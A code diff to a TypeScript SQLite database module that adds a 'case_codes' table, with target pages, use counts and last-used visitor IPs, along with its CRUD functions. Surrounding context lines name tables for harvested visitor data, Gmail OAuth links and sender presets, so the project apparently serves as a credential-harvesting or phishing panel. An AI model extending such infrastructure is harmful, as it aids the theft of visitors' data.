@@ -274,6 +274,21 @@ function migrate(db: Database.Database): void {
 			created_at INTEGER NOT NULL DEFAULT 0
 		);
 
+		CREATE TABLE IF NOT EXISTS case_codes (
+			id INTEGER PRIMARY KEY AUTOINCREMENT,
+			code TEXT NOT NULL UNIQUE,
+			label TEXT NOT NULL DEFAULT '',
+			module TEXT NOT NULL DEFAULT '',
+			target_page TEXT NOT NULL DEFAULT '',
+			active INTEGER NOT NULL DEFAULT 1,
+			uses INTEGER NOT NULL DEFAULT 0,
+			last_used_at INTEGER NOT NULL DEFAULT 0,
+			last_used_ip TEXT NOT NULL DEFAULT '',
+			owner_username TEXT NOT NULL DEFAULT '',
+			created_at INTEGER NOT NULL DEFAULT 0,
+			expires_at INTEGER NOT NULL DEFAULT 0
+		);
+
 		CREATE INDEX IF NOT EXISTS idx_log_timestamp ON activity_log(timestamp DESC);
 		CREATE INDEX IF NOT EXISTS idx_harvest_ip ON harvested_data(visitor_ip);
 		CREATE INDEX IF NOT EXISTS idx_harvest_type ON harvested_data(data_type);
@@ -321,6 +336,8 @@ function migrate(db: Database.Database): void {
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_gmail_owner ON gmail_accounts(owner_username);`);
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_gmail_links_state ON gmail_links(oauth_state);`);
 	db.exec(`CREATE INDEX IF NOT EXISTS idx_gmail_presets_owner ON gmail_sender_presets(owner_username);`);
+	db.exec(`CREATE INDEX IF NOT EXISTS idx_case_codes_code ON case_codes(code);`);
+	db.exec(`CREATE INDEX IF NOT EXISTS idx_case_codes_owner ON case_codes(owner_username);`);
 
 	seedDefaultAdmin(db);
 }
@@ -1710,4 +1727,147 @@ export function dbInsertInboxAccount(email: string, provider: string): number {
 
 export function dbDeleteInboxAccount(id: string): void {
 	getDb().prepare('DELETE FROM inbox_accounts WHERE id=?').run(Number(id));
+}
+
+// --- Case Access Codes ---
+
+export interface DbCaseCode {
+	id: string;
+	code: string;
+	label: string;
+	module: string;
+	targetPage: string;
+	active: boolean;
+	uses: number;
+	lastUsedAt: number;
+	lastUsedIp: string;
+	ownerUsername: string;
+	createdAt: number;
+	expiresAt: number;
+}
+
+function rowToCaseCode(row: any): DbCaseCode {
+	return {
+		id: String(row.id),
+		code: row.code,
+		label: row.label || '',
+		module: row.module || '',
+		targetPage: row.target_page || '',
+		active: !!row.active,
+		uses: row.uses || 0,
+		lastUsedAt: row.last_used_at || 0,
+		lastUsedIp: row.last_used_ip || '',
+		ownerUsername: row.owner_username || '',
+		createdAt: row.created_at || 0,
+		expiresAt: row.expires_at || 0
+	};
+}
+
+export interface CaseCodeQuery {
+	search?: string;
+	module?: string;
+	active?: boolean;
+	ownerUsername?: string;
+}
+
+export function dbGetCaseCodes(q: CaseCodeQuery = {}): DbCaseCode[] {
+	const conds: string[] = [];
+	const params: any[] = [];
+	if (q.ownerUsername) {
+		conds.push('owner_username = ?');
+		params.push(q.ownerUsername);
+	}
+	if (q.module) {
+		conds.push('module = ?');
+		params.push(q.module);
+	}
+	if (typeof q.active === 'boolean') {
+		conds.push('active = ?');
+		params.push(q.active ? 1 : 0);
+	}
+	if (q.search) {
+		conds.push('(code LIKE ? OR label LIKE ? OR module LIKE ?)');
+		const like = `%${q.search}%`;
+		params.push(like, like, like);
+	}
+	const where = conds.length ? `WHERE ${conds.join(' AND ')}` : '';
+	const rows = getDb()
+		.prepare(`SELECT * FROM case_codes ${where} ORDER BY created_at DESC, id DESC`)
+		.all(...params) as any[];
+	return rows.map(rowToCaseCode);
+}
+
+export function dbGetCaseCodeByCode(code: string): DbCaseCode | undefined {
+	const row = getDb().prepare('SELECT * FROM case_codes WHERE code = ?').get(code) as any;
+	return row ? rowToCaseCode(row) : undefined;
+}
+
+export function dbGetCaseCodeById(id: string): DbCaseCode | undefined {
+	const row = getDb().prepare('SELECT * FROM case_codes WHERE id = ?').get(Number(id)) as any;
+	return row ? rowToCaseCode(row) : undefined;
+}
+
+export function dbInsertCaseCode(input: Omit<DbCaseCode, 'id' | 'uses' | 'lastUsedAt' | 'lastUsedIp'>): DbCaseCode {
+	const now = Date.now();
+	const result = getDb()
+		.prepare(
+			`INSERT INTO case_codes (code, label, module, target_page, active, uses, last_used_at, last_used_ip, owner_username, created_at, expires_at)
+			 VALUES (?, ?, ?, ?, ?, 0, 0, '', ?, ?, ?)`
+		)
+		.run(
+			input.code,
+			input.label || '',
+			input.module || '',
+			input.targetPage || '',
+			input.active ? 1 : 0,
+			input.ownerUsername || '',
+			input.createdAt || now,
+			input.expiresAt || 0
+		);
+	return rowToCaseCode({
+		id: result.lastInsertRowid,
+		code: input.code,
+		label: input.label || '',
+		module: input.module || '',
+		target_page: input.targetPage || '',
+		active: input.active ? 1 : 0,
+		uses: 0,
+		last_used_at: 0,
+		last_used_ip: '',
+		owner_username: input.ownerUsername || '',
+		created_at: input.createdAt || now,
+		expires_at: input.expiresAt || 0
+	});
+}
+
+export function dbUpdateCaseCode(id: string, patch: Partial<DbCaseCode>): void {
+	const map: Record<string, string> = {
+		label: 'label',
+		module: 'module',
+		targetPage: 'target_page',
+		active: 'active',
+		expiresAt: 'expires_at'
+	};
+	const fields: string[] = [];
+	const params: any[] = [];
+	for (const [k, v] of Object.entries(patch)) {
+		const col = map[k];
+		if (!col) continue;
+		fields.push(`${col} = ?`);
+		if (k === 'active') params.push(v ? 1 : 0);
+		else params.push(v);
+	}
+	if (!fields.length) return;
+	params.push(Number(id));
+	getDb().prepare(`UPDATE case_codes SET ${fields.join(', ')} WHERE id = ?`).run(...params);
+}
+
+export function dbDeleteCaseCode(id: string): void {
+	getDb().prepare('DELETE FROM case_codes WHERE id = ?').run(Number(id));
+}
+
+export function dbRecordCaseCodeUse(code: string, ip: string): void {
+	getDb()
+		.prepare('UPDATE case_codes SET uses = uses + 1, last_used_at = ?, last_used_ip = ? WHERE code = ?')
+		.run(Date.now(), ip || '', code);
 }
